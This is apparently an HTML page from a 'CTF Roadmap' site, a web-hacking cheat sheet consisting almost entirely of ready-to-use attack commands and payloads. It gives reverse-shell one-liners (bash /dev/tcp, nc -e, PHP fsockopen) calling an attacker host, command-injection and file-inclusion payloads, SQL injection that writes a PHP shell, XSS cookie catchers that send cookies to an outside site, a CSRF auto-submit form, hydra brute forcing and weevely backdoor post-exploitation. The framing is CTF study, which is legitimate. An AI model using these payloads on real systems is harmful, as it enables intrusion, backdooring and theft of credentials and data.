@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  <link rel="canonical" href="https://ctf-roadmap.github.io/web/">
+  <link rel="shortcut icon" href="../img/favicon.ico">
+  <title>Web - CTF Roadmap</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
+
+  <link rel="stylesheet" href="../css/theme.css" />
+  <link rel="stylesheet" href="../css/theme_extra.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "Web";
+    var mkdocs_page_input_path = "web.md";
+    var mkdocs_page_url = "/web/";
+  </script>
+  
+  <script src="../js/jquery-2.1.1.min.js" defer></script>
+  <script src="../js/modernizr-2.8.3.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+        <a href=".." class="icon icon-home"> CTF Roadmap</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Web</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#information-gathering">Information Gathering</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#file-upload-vulnerabilities">File Upload Vulnerabilities</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#code-execution-vulnerabilities">Code Execution Vulnerabilities</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#local-file-inclusion-vulnerabilities">Local File Inclusion Vulnerabilities</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#remote-file-inclusion-vulnerabilities">Remote File Inclusion Vulnerabilities</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#sql-injection-vulnerabilities">SQL Injection Vulnerabilities</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#manual-approach">Manual Approach</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#automated-approach">Automated Approach</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#xss-vulnerabilities">XSS Vulnerabilities</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#csrf-vulnerabilities">CSRF Vulnerabilities</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#brute-force-dictionnary-attack">Brute Force &amp; Dictionnary Attack</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#post-exploitation">Post Exploitation</a>
+    </li>
+    </ul>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../linux/">Linux</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../windows/">Windows</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../forensics/">Forensics</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../reversing/">Reversing</a>
+                    </li>
+                </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../networking/">Networking</a>
+                    </li>
+                </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="..">CTF Roadmap</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="..">Docs</a> &raquo;</li>
+    
+      
+    
+    <li>Web</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  
+  <hr/>
+</div>
+
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="web-hacking">Web Hacking</h1>
+<h2 id="information-gathering">Information Gathering</h2>
+<ul>
+<li><a href="">Whois Lookup</a> ; <a href="">Netcracft Site Report</a> ; <a href="">Robtex DNS Lookup</a> ;</li>
+<li>Reverse DNS Lookup: <a href="">Bing</a> --&gt; <code>ip: {target_ip}</code> ;</li>
+<li>Maltego.</li>
+</ul>
+<pre><code class="language-bash"># subdomains discovery
+python knockpy.py {domain}
+
+# files and directories discovery
+dirb http://{domain}
+</code></pre>
+<h2 id="file-upload-vulnerabilities">File Upload Vulnerabilities</h2>
+<pre><code class="language-bash"># create a reverse shell
+weevely generate {password} {rsh.php}
+
+# run reverse shell after upload
+weevely http://{rsh_location} {password}
+  &gt; help
+</code></pre>
+<p>Bypass file upload filters using Burp: <code>rsh.jpg --&gt; upload --&gt; rsh.php</code> and <code>rsh.jpg --&gt; upload --&gt; rsh.php.jpg</code>.</p>
+<h2 id="code-execution-vulnerabilities">Code Execution Vulnerabilities</h2>
+<pre><code class="language-bash"># add some commands after the expected one
+{cmd} ; bash -i &gt;&amp; /dev/tcp/{atk_ip}/{atk_port} 0&gt;&amp;1
+{cmd} &amp;&amp; php -r '$sock=fsockopen(&quot;atk_ip&quot;, atk_port); exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);';
+{cmd} | nc -e /bin/sh {atk_ip} {atk_port}
+</code></pre>
+<h2 id="local-file-inclusion-vulnerabilities">Local File Inclusion Vulnerabilities</h2>
+<p>Exploit <code>/proc/self/environ</code> file: Burp --&gt; Headers --&gt; UA: <code>&lt;? passthru("nc -e /bin/sh {atk_ip} {atk_port}"); ?&gt;</code>.</p>
+<p>Exploit <code>/var/log/auth.log</code> file: <code>ssh "&lt;? passthru(base64_decode('{nc_cmd_base64_encoded}')); ?&gt;"@{target_ip}</code>.</p>
+<h2 id="remote-file-inclusion-vulnerabilities">Remote File Inclusion Vulnerabilities</h2>
+<pre><code class="language-bash"># create reverse shell
+echo '&lt;?php passthru(&quot;nc -e /bin/sh {atk_ip} {atk_port}&quot;); ?&gt;' &gt; {rsh.txt}
+
+# include reverse shell from target
+curl http://{domain}/?page=http://{atk_ip}/{rsh.txt}
+
+# beautify a basic shell
+SHELL=/bin/sh script -q /dev/null
+</code></pre>
+<h2 id="sql-injection-vulnerabilities">SQL Injection Vulnerabilities</h2>
+<h3 id="manual-approach">Manual Approach</h3>
+<pre><code class="language-bash"># mysql basic connection
+mysql -u {user} -h {host} -p
+  &gt; show databases;
+  &gt; use {db};
+  &gt; show tables;
+
+# search for injection
+INPUT=&quot;blabla' ORDER BY 1000 %23&quot;
+
+# general login bypass
+INPUT=&quot;blabla' %23&quot;
+INPUT=&quot;blabla' OR 1=1 %23&quot;
+
+# try to get the columns number fetched
+INPUT=&quot;blabla' ORDER BY {x} %23&quot;
+
+# get displayed columns number
+INPUT=&quot;blabla' UNION SELECT 1,2,3,...{x} %23&quot;
+
+# get basic database info
+INPUT=&quot;blabla' UNION SELECT database(),version(),user(),...{x} %23&quot;
+
+# get tables names
+INPUT=&quot;blabla' UNION SELECT table_name,null,null,...{x} FROM information_schema.tables WHERE table_schema = {db} %23&quot;
+
+# get table columns
+INPUT=&quot;blabla' UNION SELECT column_name,null,null,...{x} %23 FROM information_schema.columns WHERE table_name = {table} %23&quot;
+
+# display a sepcific record from list whereas only one is expected
+INPUT=&quot;blabla' UNION ... LIMIT {row_number},1 %23&quot;
+
+# bypass keyword filters
+INPUT=&quot;blabla' uNiOn sElEcT ... %23&quot;
+INPUT=&quot;blabla' uNiOn+sElEcT+... %23&quot;
+INPUT=&quot;blabla' uNiOn/**/sElEcT/**/... %23&quot;
+
+# read file from SQL
+INPUT=&quot;blabla' UNION SELECT null, load_file('{file}') %23&quot;
+
+# write file from SQL
+INPUT=&quot;blabla' UNION SELECT null, '&lt;?php passthru(&quot;nc -e /bin/sh {atk_ip} {atk_port}&quot;); ?&gt;' INTO OUTFILE '{/tmp/rsh.php}' %23&quot;
+</code></pre>
+<h3 id="automated-approach">Automated Approach</h3>
+<pre><code class="language-bash"># get db names
+sqlmap -u &quot;{url_with_params}&quot; --dbs
+
+# get current user
+sqlmap -u &quot;{url_with_params}&quot; --current-user
+
+# get tables from database
+sqlmap -u &quot;{url_with_params}&quot; --tables -D {db}
+
+# get columns from table
+sqlmap -u &quot;{url_with_params}&quot; --columns -T {table} -D {db}
+
+# dump table data
+sqlmap -u &quot;{url_with_params}&quot; --dump -T {table} -D {db}
+
+# get an os shell
+sqlmap -u &quot;{url_with_params}&quot; --os-shell
+
+# get an sql shell
+sqlmap -u &quot;{url_with_params}&quot; --sql-shell
+</code></pre>
+<h2 id="xss-vulnerabilities">XSS Vulnerabilities</h2>
+<pre><code class="language-html">&lt;!-- search for XSS --&gt;
+&lt;script&gt;alert(1);&lt;/script&gt;
+
+&lt;!-- create an HTML cookie catcher --&gt;
+&lt;svg onload=&quot;document.body.innerHTML=document.body.innerHTML.concat('&lt;img src=\'{catcher_site}'.concat(btoa(document.cookie)).concat('\' /&gt;'))&quot; /&gt;
+
+&lt;!-- create a JS cookie catcher --&gt;
+&lt;script&gt;
+  var payload = &quot;var request = new XMLHttpRequest();
+  request.onreadystatechange = function () {
+      var DONE = this.DONE || 4;
+      if (this.readyState === DONE){
+          var encoded = btoa(request.responseText);
+          document.location = '{catcher_site}?' + encoded;
+      }
+  };
+  request.open('GET', '/', true);
+  request.send(null);&quot;;
+&lt;/script&gt;
+&lt;svg onload=&quot;eval(atob('{base64_encoded_payload}'))&quot; /&gt;
+
+&lt;!-- create an XSS reverse shell --&gt;
+&lt;img src=http://{atk_ip}/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'{atk_ip}'$IFS'{atk_port}')&gt;
+
+&lt;!-- hook target using BEEF --&gt;
+&lt;script src=&quot;http://{atk_ip}:3000/hook.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>BEEF exploit --&gt; Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar.</p>
+<h2 id="csrf-vulnerabilities">CSRF Vulnerabilities</h2>
+<pre><code class="language-html">&lt;!-- create an hidden form to be submitted by the target --&gt;
+&lt;form id=&quot;csrf-form&quot; action=&quot;http://{full_path_to_form}&quot; method=&quot;post&quot; hidden&gt;
+  &lt;input name=&quot;{blabla}&quot; value=&quot;{blabla}&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit();&lt;/script&gt;
+
+&lt;!-- create a link that redirect to a website hosting the csrf form --&gt;
+&lt;a href=&quot;https://{atk}.tiiny.site&quot;&gt;&lt;/a&gt;
+</code></pre>
+<h2 id="brute-force-dictionnary-attack">Brute Force &amp; Dictionnary Attack</h2>
+<pre><code class="language-bash"># create a wordlist
+crunch {min} {max} {symbols} -t {pattern} -o {outfile}
+
+# crack a post login form using the wordlist
+hydra {target_ip} -l {user} -P {wordlist} http-post-form &quot;/{path_to_login_form}:{user}=^USER^&amp;{password}=^PASS^:F={fail_login_msg}&quot;
+</code></pre>
+<h2 id="post-exploitation">Post Exploitation</h2>
+<pre><code class="language-bash"># escalate from basic reverse shell to weevely
+atk   &gt; weevely generate {passwd} {rsh.txt}
+
+target&gt; wget http://{atk_ip}/{rsh.txt}
+      &gt; mv {rsh.txt} {rsh.php}
+
+atk   &gt; weevely http://{target_ip}/{rsh.php} {passwd}
+
+# advanced weevely usage
+&gt; help
+&gt; system-info
+&gt; shell-sh -vector {vect} {cmd}
+&gt; file_read -vector {vect} {file}
+&gt; file_download -vector {vect} {remote_path} {local_path}  
+&gt; file_upload -vector {vect} {local_path} ./{remote_path}  
+&gt; backdoor_reversetcp -vector {vect} {atk_ip} {atk_port}
+&gt; sql_dump -vector {vect} -host localhost -lpath {local_path} {db} {user} {passwd}
+</code></pre>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../linux/" class="btn btn-neutral float-right" title="Linux">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+      <p>Copyright &copy; 2021 <a href="https://ctf-roadmap.github.io/profile/">amorix</a>.</p>
+    
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+      <span><a href="../linux/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '..';</script>
+    <script src="../js/theme_extra.js" defer></script>
+    <script src="../js/theme.js" defer></script>
+      <script src="../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
